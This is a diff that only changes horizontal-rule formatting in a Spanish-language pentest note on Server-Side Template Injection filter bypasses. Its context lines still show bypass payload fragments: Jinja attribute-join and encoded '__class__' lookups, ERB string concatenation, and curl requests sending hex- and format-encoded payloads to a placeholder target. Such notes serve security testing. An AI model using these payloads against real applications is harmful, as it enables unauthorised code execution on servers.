@@ -16,7 +16,7 @@ linked:
 ---
 # SSTI - Bypasses y Filter Evasion
 
-***
+---
 
 ## Encoding (Unicode / Hex / Base64)
 
@@ -34,7 +34,7 @@ linked:
 | `{{ ['__cl','ass__']\|join }}` | Array join concat | Filter strict literal. |
 ^ssti-bypass-encoding
 
-___
+---
 
 ## String Concatenation
 
@@ -52,7 +52,7 @@ ___
 | `<%= "sys" + "tem" %>` | ERB direct concat | Ruby. |
 ^ssti-bypass-concat
 
-___
+---
 
 ## Attribute Lookup Chains
 
@@ -89,7 +89,7 @@ curl -G "https://target/page" --data-urlencode "q={{()|attr('\x5f\x5fclass\x5f\x
 curl -G "https://target/page" --data-urlencode "q={{()|attr('%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95))}}"
 ```
 
-___
+---
 
 ## Comment / Whitespace Tricks
 
@@ -122,4 +122,4 @@ ___
 3. Combinar capas: hex + concat + attr filter
 ```
 
-***
+---
